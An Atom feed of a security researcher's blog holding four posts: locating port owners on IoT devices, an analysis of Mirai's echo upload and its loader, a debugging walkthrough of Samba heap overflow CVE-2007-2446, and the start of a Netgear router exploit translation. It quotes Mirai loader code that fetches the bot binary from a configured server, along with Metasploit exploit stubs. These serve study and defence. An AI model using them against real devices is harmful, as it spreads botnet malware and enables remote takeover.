<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>xd_xd&#39;s blog</title>
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://xdxd.love/"/>
  <updated>2018-01-30T01:27:03.431Z</updated>
  <id>http://xdxd.love/</id>
  
  <author>
    <name>xd_xd</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>物联网设备查看开放端口对应的进程</title>
    <link href="http://xdxd.love/2018/01/29/%E7%89%A9%E8%81%94%E7%BD%91%E8%AE%BE%E5%A4%87%E6%9F%A5%E7%9C%8B%E5%BC%80%E6%94%BE%E7%AB%AF%E5%8F%A3%E5%AF%B9%E5%BA%94%E7%9A%84%E8%BF%9B%E7%A8%8B/"/>
    <id>http://xdxd.love/2018/01/29/物联网设备查看开放端口对应的进程/</id>
    <published>2018-01-29T06:29:29.000Z</published>
    <updated>2018-01-30T01:27:03.431Z</updated>
    
    <content type="html"><![CDATA[<h2 id="场景">场景</h2><p>linux下查看开放的端口，其实只需要一个命令就可以了。<code>netstat -atnp</code><br><img src="/images/netstat1.png" alt=""><br>但是在不少物联网网设备上，采用busybox，netstat没有p参数。或者干脆没有netstat命令。<br><img src="/images/netstat2.png" alt=""></p>
<h2 id="解决方案">解决方案</h2><p>1，第一个想法是是否可以下载一个带p参数的netstat命令使用。<br>2，fuser命令 发现这个场景下fuser可能 返回空。。<br><img src="/images/netstat3.png" alt=""></p>
<p>3，使用/proc/net/tcp中的信息。这个文件之前在http<a href="http://xdxd.love/2016/05/23/%E4%B8%80%E4%B8%AA%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">一个任意文件读取漏洞分析</a> 中讲过。</p>
<p>查看 /proc/net/tcp 获取端口对应的inode号，端口为16进制，比如端口17998 对应0x464E</p>
<p><code>cat /proc/net/tcp | grep     464E</code></p>
<pre><code><span class="number">6</span>: C0A80101:<span class="number">464</span>E <span class="number">00000000</span>:<span class="number">0000</span> <span class="number">0</span>A <span class="number">00000000</span>:<span class="number">00000000</span> <span class="number">00</span>:<span class="number">00000000</span> <span class="number">00000000</span>     <span class="number">0</span>        <span class="number">0</span> <span class="number">3956</span> <span class="number">1</span> <span class="number">8</span>b7df330 <span class="number">99</span> <span class="number">0</span> <span class="number">0</span> <span class="number">10</span> -<span class="number">1</span>
</code></pre><p>获得对应的inode号为3956</p>
<pre><code><span class="keyword">for</span> dir <span class="keyword">in</span> `find /<span class="keyword">proc</span>/ -name <span class="string">"fd"</span>`; <span class="keyword">do</span> ls -l $dir | grep 'socket\:\[<span class="number">3956</span>' &amp;&amp; echo $dir;done  
</code></pre><p><img src="/images/netstat3.png" alt=""></p>
<p>获得对应的进程为3304</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;场景&quot;&gt;场景&lt;/h2&gt;&lt;p&gt;linux下查看开放的端口，其实只需要一个命令就可以了。&lt;code&gt;netstat -atnp&lt;/code&gt;&lt;br&gt;&lt;img src=&quot;/images/netstat1.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;但是在不少物联网网设备上，采用bu
    
    </summary>
    
      <category term="万物互联" scheme="http://xdxd.love/categories/%E4%B8%87%E7%89%A9%E4%BA%92%E8%81%94/"/>
    
    
      <category term="万物互联" scheme="http://xdxd.love/tags/%E4%B8%87%E7%89%A9%E4%BA%92%E8%81%94/"/>
    
  </entry>
  
  <entry>
    <title>mirai的echo上传文件机制分析</title>
    <link href="http://xdxd.love/2017/12/26/mirai%E7%9A%84echo%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E6%9C%BA%E5%88%B6%E5%88%86%E6%9E%90/"/>
    <id>http://xdxd.love/2017/12/26/mirai的echo上传文件机制分析/</id>
    <published>2017-12-26T08:59:19.000Z</published>
    <updated>2018-01-08T08:35:46.790Z</updated>
    
    <content type="html"><![CDATA[<p>物联网设备系统资源有限，所以操作系统都会进行精简。之前在乌云看到对某个智能设备木马的分析，其中采用了使用echo写16进制，写一个简单的wget到设备上。可见这个思路在很早之前就已经被广泛使用了。最近在分析智能设备的过程中，也遇到了同样的问题，想要传一个gdbserver到设备上，但是没有wget之类下载工具，只能采用echo的方式。从想法到实际上完成还是经过了一些尝试。</p>
<h2 id="Mirai的echo上传文件机制">Mirai的echo上传文件机制</h2><p>针对Mirai已经有了不少的分析文章，大多集中在分析bot的功能，对echo的上传的文件的方式也有提及。但是缺少一些能在实际项目中应用的细节。下面截图出自RSA会议的截图。</p>
<p><img src="/images/miraiecho1.png" alt=""></p>
<p>Mirai在源码中定义了3中下载bot的方式。</p>
<p><img src="/images/miraiecho2.png" alt=""></p>
<p>显然，echo的方式是最通用的。通过直接16进制到文件。</p>
<h2 id="Mirai的tools目录">Mirai的tools目录</h2><p>接下来只要搞定echo哪个文件就可以了，直接echo一个大文件显然是不现实的，需要找一个有下载文件功能的足够小的程序。首先关注到的是Mirai的tools的文件夹。显然wget.c应该是下载文件用的。</p>
<p>下图是绿盟科技在<a href="http://blog.nsfocus.net/mirai-source-analysis-report/" target="_blank" rel="external">Mirai源码分析报告</a>的截图。不过他这里有个小失误，wget确实是下载文件用的。但是作者在测试的时候，直接运行的wget命令，显然是操作系统自带的wget工具。</p>
<p><img src="/images/miraiecho3.png" alt=""></p>
<p>mirai的wget的命令格式为： wget ip_address remote_file host</p>
<p><img src="/images/miraiecho4.png" alt=""></p>
<p><img src="/images/miraiecho5.png" alt=""></p>
<p>经过测试，发现指定-static参数之后，这个wget大小也有几百K。放在那跑了一晚上，第二天一看设备挂掉了。。。。</p>
<h2 id="Mirai_echo_upload使用的文件">Mirai echo upload使用的文件</h2><p>mirai使用echo方式上传的时候，首先上传一个很小的文件，用于下载mirai。大小为1K左右。目录为dlr<br><img src="/images/miraiecho6.png" alt=""></p>
<p>大部分分析文章都忽略了这个文件夹。其中，main.c是源码，build.sh是编译脚本，release是编译完成的2进制文件。</p>
<p>先看一下build.sh<br><img src="/images/miraiecho7.png" alt=""></p>
<p>可以看到他采用了一些优化的手段来减少最终的文件的大小。经过strip之后，文件体积大致为原来的一半左右。</p>
<p>main.c中下载的地址都是写死的，编译之前需要修改ip和文件名。</p>
<pre><code>    <span class="preprocessor">#<span class="keyword">define</span> HTTP_SERVER utils_inet_addr(<span class="number">127</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>) <span class="comment">// CHANGE TO YOUR HTTP SERVER IP</span></span>

<span class="preprocessor">#<span class="keyword">ifdef</span> DEBUG</span>
<span class="built_in">printf</span>(<span class="string">"Connected to host\n"</span>);
<span class="preprocessor">#<span class="keyword">endif</span></span>

<span class="keyword">if</span> (write(sfd, <span class="string">"GET /bins/mirai."</span> BOT_ARCH <span class="string">" HTTP/1.0\r\n\r\n"</span>, <span class="number">16</span> + arch_strlen + <span class="number">13</span>) != (<span class="number">16</span> + arch_strlen + <span class="number">13</span>))
{
<span class="preprocessor">#<span class="keyword">ifdef</span> DEBUG</span>
<span class="built_in">printf</span>(<span class="string">"Failed to send get request.\n"</span>);
<span class="preprocessor">#<span class="keyword">endif</span></span>
以及增加
<span class="preprocessor">#<span class="keyword">define</span> DEBUG </span>
</code></pre><p>用来输出调试信息。</p>
<h2 id="编译方式">编译方式</h2><p>参考<a href="https://paper.seebug.org/papers/Archive/Mirai%E6%9C%A8%E9%A9%AC%E6%80%BB%E7%BB%93%E2%80%94%E4%BB%8E%E6%BA%90%E7%A0%81%E5%88%B0%E5%8F%8D%E6%B1%87%E7%BC%96.pdf" target="_blank" rel="external">Mirai木马总结—从源码到反汇编</a></p>
<h2 id="python操作串口">python操作串口</h2><p>代码实现也有遇到一些问题，比如一次写多少个字节效率最高。mirai是一次写128个字节。</p>
<p><img src="/images/miraiecho8.png" alt=""></p>
<p>具体代码关注公众号获取~~</p>
<h2 id="遇到的坑：">遇到的坑：</h2><p>1，mac上输入串口密码的问题<br>2，文件的大小端?<br>3,   不明原因的卡死<br>4, 长时间写串口把设备写重启。<br>5，cc1: error: main.c: Value too large for defined data type<br>磁盘mount的问题。在docker挂载的目录中编译导致的，直接copy到docker里面编译即可。<br><a href="https://stackoverflow.com/questions/2438890/cc1plus-error-include-value-too-large-for-defined-data-type-when-compiling-wi" target="_blank" rel="external">https://stackoverflow.com/questions/2438890/cc1plus-error-include-value-too-large-for-defined-data-type-when-compiling-wi</a><br>6,编译版本的问题导致illegial instruction</p>
<p>mirai编译的文档中只有armv4,armv5,armv6的版本，但是给出的bin中却有v7的版本，在我使用的设备上，只有v7是可以执行的，其他都是报非法的指令错误。使用<a href="https://github.com/dockcross/dockcross" target="_blank" rel="external">https://github.com/dockcross/dockcross</a> 编译成功。</p>
<p>7，gdbserver编译 <a href="https://github.com/mzpqnxow/gdb-static-cross" target="_blank" rel="external">https://github.com/mzpqnxow/gdb-static-cross</a></p>
<p>参考资料：</p>
<p><a href="http://blog.nsfocus.net/mirai-source-analysis-report/" target="_blank" rel="external">http://blog.nsfocus.net/mirai-source-analysis-report/</a><br><a href="http://www.freebuf.com/articles/terminal/117927.html" target="_blank" rel="external">http://www.freebuf.com/articles/terminal/117927.html</a><br><a href="https://xmsg.org/wordpress/2016/12/mirai%E6%BA%90%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90ppt-%E5%88%86%E6%9E%90%E4%BA%86mirai-ddos%E7%89%B9%E6%80%A7-%E5%B9%B6%E7%BB%99%E5%87%BA%E4%BA%86mirai-ddos%E9%98%B2%E6%8A%A4%E6%8E%AA%E6%96%BD/" target="_blank" rel="external">https://xmsg.org/wordpress/2016/12/mirai%E6%BA%90%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90ppt-%E5%88%86%E6%9E%90%E4%BA%86mirai-ddos%E7%89%B9%E6%80%A7-%E5%B9%B6%E7%BB%99%E5%87%BA%E4%BA%86mirai-ddos%E9%98%B2%E6%8A%A4%E6%8E%AA%E6%96%BD/</a><br><a href="http://www.nolanzong.com/2017/01/09/mirai-setup/" target="_blank" rel="external">http://www.nolanzong.com/2017/01/09/mirai-setup/</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;物联网设备系统资源有限，所以操作系统都会进行精简。之前在乌云看到对某个智能设备木马的分析，其中采用了使用echo写16进制，写一个简单的wget到设备上。可见这个思路在很早之前就已经被广泛使用了。最近在分析智能设备的过程中，也遇到了同样的问题，想要传一个gdbserver到
    
    </summary>
    
      <category term="万物互联" scheme="http://xdxd.love/categories/%E4%B8%87%E7%89%A9%E4%BA%92%E8%81%94/"/>
    
    
  </entry>
  
  <entry>
    <title>samba cve-2007-2446 堆溢出分析</title>
    <link href="http://xdxd.love/2017/11/09/samba-cve-2007-2446-%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/"/>
    <id>http://xdxd.love/2017/11/09/samba-cve-2007-2446-堆溢出分析/</id>
    <published>2017-11-09T11:09:15.000Z</published>
    <updated>2017-11-10T07:03:02.000Z</updated>
    
    <content type="html"><![CDATA[<p>之前翻译的<a href="http://xdxd.love/2017/10/16/netgear-WNR2200%E7%9A%84%E4%B8%80%E4%B8%AAheap-overflow%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">【翻译】netgear WNR2200的一个heap overflow漏洞利用</a>文中讲解samba堆溢出的利用。其实利用的漏洞是cve-2007-2446中的一个堆溢出漏洞。但是并没有详细讲解漏洞的成因以及具体的exploit调试过程。这个漏洞也比较早了，网上并没有详细的漏洞分析，只能找到cve的相关描述信息。所以这里为了学习的目的从代码层面分析一下这个漏洞和相关exploit的原理。</p>
<p><a href="https://www.samba.org/samba/security/CVE-2007-2446.html" target="_blank" rel="external">CVE-2007-2446: Multiple Heap Overflows Allow Remote Code Execution</a>包括5个不同的堆溢出漏洞，metasploit中的exploit利用的是lsa_io_trans_names函数中的那个漏洞。</p>
<p><img src="/images/cve200724461.png" alt=""></p>
<h2 id="补丁分析">补丁分析</h2><p>根据现有信息可以找到github上，samba修补这个漏洞的代码。<a href="https://github.com/samba-team/samba/commit/d34f6bb969092166c961e328229b1b05a30f6930#diff-7f3eb313a21e6237196fd7c6c1efc487" target="_blank" rel="external">r22852: merge fixes for CVE-2007-2446 and CVE-2007-2447 to all branches</a></p>
<p>根据漏洞描述可以定位到如下代码。</p>
<p><img src="/images/cve200724462.png" alt=""></p>
<p>最终可以确定，lsa_io_trans_names里的堆溢出补丁为：</p>
<p>增加</p>
<pre><code><span class="keyword">if</span> (trn<span class="subst">-&gt;</span>num_entries2 != trn<span class="subst">-&gt;</span>num_entries) { 

<span class="comment">/* RPC fault */</span>
<span class="keyword">return</span> <span class="literal">False</span>; 
} 
</code></pre><p>增加了num_entries2和num_entries的比较，如果不相同，就返回false，避免继续执行。后面的PRS_ALLOC_MEM函数中的num_entries参数修改为了num_entries2。按照漏洞产生的原理来看，前面判断了num_entries和num_entries2相等才会进入后面的逻辑，所以这里既是不改对程序的运行结果也是不影响的。</p>
<p>根据漏洞描述，猜测漏洞成因是先根据num_entries分配堆内存大小，然后写入数据的时候根据num_entries2来写入数据，如果num_entries2大于num_entries就会导致溢出，堆上数据被覆盖。而num_entries和num_entries2都是用户可控的数据。</p>
<h2 id="源码分析和动态调试">源码分析和动态调试</h2><p>猜测 PRS_ALLOC_MEM是分配内存的函数，跟进源码：</p>
<pre><code><span class="comment">#define PRS_ALLOC_MEM(ps, type, count) (type *)prs_alloc_mem_((ps),sizeof(type),(count))</span>

char <span class="keyword">*</span>prs_alloc_mem_(prs_struct <span class="keyword">*</span>ps, size_t size, unsigned int count);


/<span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span>
Allocate memory when unmarshalling... Always zero clears.
<span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span>/

<span class="comment">#if defined(PARANOID_MALLOC_CHECKER)</span>
char <span class="keyword">*</span>prs_alloc_mem_(prs_struct <span class="keyword">*</span>ps, size_t size, unsigned int count)
<span class="comment">#else</span>
char <span class="keyword">*</span>prs_alloc_mem(prs_struct <span class="keyword">*</span>ps, size_t size, unsigned int count)
<span class="comment">#endif</span>
{
    char <span class="keyword">*</span>ret = NULL;

    if (size) {
        /<span class="keyword">*</span> We can't call the type-safe version here. <span class="keyword">*</span>/
        ret = _talloc_zero_array(ps-&gt;mem_ctx, size, count, <span class="string">"parse_prs"</span>);
    }
    return ret;
}
/<span class="keyword">*</span>
alloc an zero array, checking for integer overflow in the array size
<span class="keyword">*</span>/
void <span class="keyword">*</span>_talloc_zero_array(const void <span class="keyword">*</span>ctx, size_t el_size, unsigned count, const char <span class="keyword">*</span>name)
{
    if (count &gt;= MAX_TALLOC_SIZE/el_size) {
        return NULL;
    }
    return _talloc_zero(ctx, el_size <span class="keyword">*</span> count, name);
}


/<span class="keyword">*</span>
talloc and zero memory.
<span class="keyword">*</span>/
void <span class="keyword">*</span>_talloc_zero(const void <span class="keyword">*</span>ctx, size_t size, const char <span class="keyword">*</span>name)
{
    void <span class="keyword">*</span>p = talloc_named_const(ctx, size, name);

    if (p) {
        memset(p, '\0', size);
    }

    return p;
}
</code></pre><p>分配内存，初始化为\0。使用netgear wnr2000的中samba进行动态调试分析。samba版本为3.0.24。使用metasploit中的auxiliary/dos/samba/lsa_transnames_heap进行验证。</p>
<p>抓取metasploit发送的数据包，可以看到最后一个smb协议的包如下：</p>
<p><img src="/images/cve200724463.png" alt=""></p>
<p>该metasploit模块的核心代码如下：</p>
<pre><code>print_status(<span class="string">"Connecting to the SMB service..."</span>)
connect()
smb_login()

datastore[<span class="string">'DCERPC::fake_bind_multi'</span>] = <span class="keyword">false</span>

handle = dcerpc_handle(<span class="string">'12345778-1234-abcd-ef00-0123456789ab'</span>, <span class="string">'0.0'</span>, <span class="string">'ncacn_np'</span>, [<span class="string">"\\#{pipe}"</span>])
print_status(<span class="string">"Binding to #{handle} ..."</span>)
dcerpc_bind(handle)
print_status(<span class="string">"Bound to #{handle} ..."</span>)

stub = lsa_open_policy(dcerpc)
stub &lt;&lt; NDR.<span class="keyword">long</span>(<span class="number">0</span>)
stub &lt;&lt; NDR.<span class="keyword">long</span>(<span class="number">0</span>)
stub &lt;&lt; NDR.<span class="keyword">long</span>(<span class="number">1</span>)
stub &lt;&lt; NDR.<span class="keyword">long</span>(<span class="number">0x20004</span>)
stub &lt;&lt; NDR.<span class="keyword">long</span>(<span class="number">0x100</span>)
stub &lt;&lt; (<span class="string">"X"</span> * <span class="number">16</span>) * <span class="number">0x100</span>
stub &lt;&lt; NDR.<span class="keyword">long</span>(<span class="number">1</span>)
stub &lt;&lt; NDR.<span class="keyword">long</span>(<span class="number">0</span>)

print_status(<span class="string">"Calling the vulnerable function..."</span>)
</code></pre><p>对比利用程序的源码/usr/share/metasploit-framework/modules/exploits/linux/samba/lsa_transnames_heap.rb 。</p>
<pre><code>stub = lsa_open_policy(dcerpc)

stub &lt;&lt; NDR.<span class="keyword">long</span>(<span class="number">0</span>)            <span class="preprocessor"># num_entries</span>
stub &lt;&lt; NDR.<span class="keyword">long</span>(<span class="number">0</span>)            <span class="preprocessor"># ptr_sid_enum</span>
stub &lt;&lt; NDR.<span class="keyword">long</span>(num_entries)  <span class="preprocessor"># num_entries</span>
stub &lt;&lt; NDR.<span class="keyword">long</span>(<span class="number">0x20004</span>)      <span class="preprocessor"># ptr_trans_names</span>
stub &lt;&lt; NDR.<span class="keyword">long</span>(num_entries2) <span class="preprocessor"># num_entries2</span>
stub &lt;&lt; buf
stub &lt;&lt; nops
stub &lt;&lt; payload.encoded
</code></pre><p>以上代码来自exploit。根据注释可以假设，在dos module中num_entries值为1，num_entries值为100。</p>
<p>将smbd导入IDA，搜索function name，只能找到lsa_io_q_lookup_sids，根据源码，可以找到</p>
<pre><code>LOAD:<span class="number">76</span>DE2888                 addiu   $a0, (aNames - <span class="number">0x76F6C000</span>)  <span class="preprocessor"># <span class="string">"names  "</span></span>
LOAD:<span class="number">76</span>DE288C                 lw      $t9, -<span class="number">0x7F58</span>($gp)
LOAD:<span class="number">76</span>DE2890                 addiu   $t9, (sub_76DE248C - <span class="number">0x76DDC000</span>)
LOAD:<span class="number">76</span>DE2894                 jalr    $t9
</code></pre><p>处为调用lsa_io_trans_names。在76DE2888处下断点，跟进函数。</p>
<p>之后一路F8，来到PRS_ALLOC_MEM的调用处。</p>
<p><img src="/images/cve200724464.png" alt=""></p>
<p>查看寄存器传递的函数参数：</p>
<p><img src="/images/cve200724465.png" alt=""></p>
<p>$a2的值为1，这也确认了metasploit dos 模块中定义的num_entries值为1。</p>
<p>执行完分配内存，查看寄存器$v0获得返回的地址为：761AF208</p>
<p><img src="/images/cve200724466.png" alt=""></p>
<p>对比源代码：</p>
<pre><code><span class="keyword">if</span> (UNMARSHALLING(ps)) { 

<span class="keyword">if</span> ((trn-&gt;name = PRS_ALLOC_MEM(ps, LSA_TRANS_NAME, trn-&gt;num_entries2)) == <span class="keyword">NULL</span>) { 
<span class="keyword">return</span> <span class="keyword">False</span>; 
} 
<span class="keyword">if</span> ((trn-&gt;uni_name = PRS_ALLOC_MEM(ps, UNISTR2, trn-&gt;num_entries2)) == <span class="keyword">NULL</span>) { 
<span class="keyword">return</span> <span class="keyword">False</span>; 
} 
} 
<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; trn-&gt;num_entries2; i++) { 
fstring t; 
slprintf(t, sizeof(t) - <span class="number">1</span>, <span class="string">"name[%d] "</span>, i); 
<span class="keyword">if</span>(!lsa_io_trans_name(t, &amp;trn-&gt;name[i], ps, depth)) <span class="comment">/* translated name */</span>
<span class="keyword">return</span> <span class="keyword">False</span>; 
</code></pre><p>之后进入lsa_io_trans_name函数</p>
<pre><code>Reads or writes a LSA_TRANS_NAME structure.
<span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span>/
static BOOL lsa_io_trans_name(const char <span class="keyword">*</span>desc, LSA_TRANS_NAME <span class="keyword">*</span>trn, prs_struct <span class="keyword">*</span>ps, 
int depth) 
{ 
prs_debug(ps, depth, desc, <span class="string">"lsa_io_trans_name"</span>); 
depth++; 
if(!prs_align(ps)) 
return False; 
if(!prs_uint16(<span class="string">"sid_name_use"</span>, ps, depth, &amp;trn-&gt;sid_name_use)) 
return False; 
if(!prs_align(ps)) 
return False; 
if(!smb_io_unihdr (<span class="string">"hdr_name"</span>, &amp;trn-&gt;hdr_name, ps, depth)) 
return False; 
if(!prs_uint32(<span class="string">"domain_idx "</span>, ps, depth, &amp;trn-&gt;domain_idx)) 
return False; 
return True; 
} 
</code></pre><p>动态调试发现，prs_unit16,smb_io_unihdr,prs_uint32,这里都会解析数据写入761AF208。一次循环写入16个字节。而dos 模块中设置的num_entries2是100。循环100次，导致堆溢出。</p>
<p>图为执行完循环，堆内存被破坏。</p>
<p><img src="/images/cve200724467.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;之前翻译的&lt;a href=&quot;http://xdxd.love/2017/10/16/netgear-WNR2200%E7%9A%84%E4%B8%80%E4%B8%AAheap-overflow%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/&quot;&gt;【
    
    </summary>
    
      <category term="万物互联" scheme="http://xdxd.love/categories/%E4%B8%87%E7%89%A9%E4%BA%92%E8%81%94/"/>
    
    
  </entry>
  
  <entry>
    <title>【翻译】netgear WNR2200的一个heap overflow漏洞利用</title>
    <link href="http://xdxd.love/2017/10/16/netgear-WNR2200%E7%9A%84%E4%B8%80%E4%B8%AAheap-overflow%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    <id>http://xdxd.love/2017/10/16/netgear-WNR2200的一个heap-overflow漏洞利用/</id>
    <published>2017-10-16T10:20:17.000Z</published>
    <updated>2017-10-30T03:23:23.000Z</updated>
    
    <content type="html"><![CDATA[<p>软件漏洞和对应的利用程序现在已经非常常见了。幸运的是近几年对于漏洞的响应速度和补丁的更新时间也有了显著提高。但是在嵌入式设备的领域，由于固件升级需要用户下载一个新的固件包，然后升级设备才能解决存在的问题，所以嵌入式设备通常都是使用了比较老的操作系统和软件，没有及时更新到安全的新版本。</p>
<p>但是由于嵌入式设备为了省电的原因通常都是使用RISC架构的CPU，比如ARM和MIPS。而目前的大部分exploit都是针对X86的，针对RISC的POC相对较少也导致嵌入式设备的安全没有得到足够的重视。</p>
<p>本篇博客介绍将一个已知的x86的exploit修改成适用于mips架构的过程。分析对象为netgear WNR2200路由器。</p>
<h2 id="固件分析">固件分析</h2><p>为了寻找合适的exploit，需要先对固件进行分析。从网上可以下载到<br> (version 1.0.1.96) 版本的固件，解压之后发现是个img后缀的文件。使用binwalk进行分析如下：</p>
<pre><code>DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
<span class="number">192</span>           <span class="number">0xC0</span>            Squashfs filesystem, big endian,
version <span class="number">3.0</span>, size: <span class="number">6033818</span> bytes,{jump-to-offset:<span class="number">6033818</span>}{file-size:<span class="number">6033818</span>}
<span class="number">1379</span> inodes, blocksize: <span class="number">65536</span> bytes, created: Thu Mar <span class="number">26</span> <span class="number">03</span>:<span class="number">33</span>:<span class="number">52</span> <span class="number">2015</span>
<span class="number">336044</span>        <span class="number">0x520AC</span>         LZMA compressed data, properties:
<span class="number">0x5D</span>, dictionary size: <span class="number">8388608</span> bytes, uncompressed size: <span class="number">2740358</span> bytes
</code></pre><p>根据分析结果，binwalk识别出在这个文件中包含一个squashFS格式的文件系统。使用unsquashfs工具进行分析。命令为<br>“unsquashfs –s”</p>
<pre><code>Reading a different endian SQUASHFS filesystem <span class="function_start"><span class="keyword">on</span></span> C0.squashfs
Found a valid big endian SQUASHFS <span class="number">3</span>:<span class="number">0</span> superblock <span class="function_start"><span class="keyword">on</span></span> C0.squashfs.
Creation <span class="keyword">or</span> <span class="keyword">last</span> append <span class="property">time</span> Thu Mar <span class="number">26</span> <span class="number">03</span>:<span class="number">33</span>:<span class="number">52</span> <span class="number">2015</span>
Filesystem size <span class="number">5892.40</span> Kbytes (<span class="number">5.75</span> Mbytes)
Block size <span class="number">65536</span>
Filesystem <span class="keyword">is</span> <span class="keyword">not</span> exportable via NFS
Inodes are compressed
Data <span class="keyword">is</span> compressed
Fragments are compressed
Always_use_fragments option <span class="keyword">is</span> <span class="keyword">not</span> specified
Check data <span class="keyword">is</span> <span class="keyword">not</span> present <span class="keyword">in</span> <span class="keyword">the</span> filesystem
Duplicates are removed
Number <span class="keyword">of</span> fragments <span class="number">101</span>
Number <span class="keyword">of</span> inodes <span class="number">1379</span>
Number <span class="keyword">of</span> uids <span class="number">1</span>
Number <span class="keyword">of</span> gids <span class="number">0</span>
</code></pre><p>这也确认了固件文件中确实存在一个有效的SquashFS格式的文件系统。然后尝试进行解压，程序报错。</p>
<pre><code>Reading a different endian SQUASHFS filesystem <span class="keyword">on</span> C0.squashfs
<span class="keyword">Parallel</span> unsquashfs: <span class="keyword">Using</span> <span class="number">8</span> processors
gzip uncompress failed <span class="keyword">with</span> error code -<span class="number">3</span>
read_block: failed <span class="keyword">to</span> <span class="keyword">read</span> <span class="keyword">block</span> @<span class="number">0</span>x5c0f6d
read_fragment_table: failed <span class="keyword">to</span> <span class="keyword">read</span> fragment table <span class="keyword">block</span>
FATAL ERROR:failed <span class="keyword">to</span> <span class="keyword">read</span> fragment table
